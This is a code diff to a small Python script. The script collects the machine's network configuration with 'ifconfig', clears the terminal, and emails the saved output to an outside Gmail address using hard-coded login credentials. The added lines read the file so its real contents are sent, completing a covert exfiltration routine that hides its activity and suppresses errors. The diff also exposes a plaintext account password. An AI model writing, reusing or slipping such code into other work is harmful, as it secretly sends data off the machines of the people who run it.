@@ -5,11 +5,13 @@ def ty():
     x= os.system ('ifconfig>>IP2.txt')
     x= os.system ('clear')
     x= os.system ('ls')
+o=open(r'IP2.txt')
+y=o.read()
 try:
     smtpObj=smtplib.SMTP('smtp.gmail.com',587)
     smtpObj.starttls()
     smtpObj.login('germanreht@gmail.com','rostelekom')
-    smtpObj.sendmail('germanreht@gmail.com','germanreht2@gmail.com',IP2.txt)
+    smtpObj.sendmail('germanreht@gmail.com','germanreht2@gmail.com',y)
     smtpObj.quit()
 except Exception as e:
     print('')
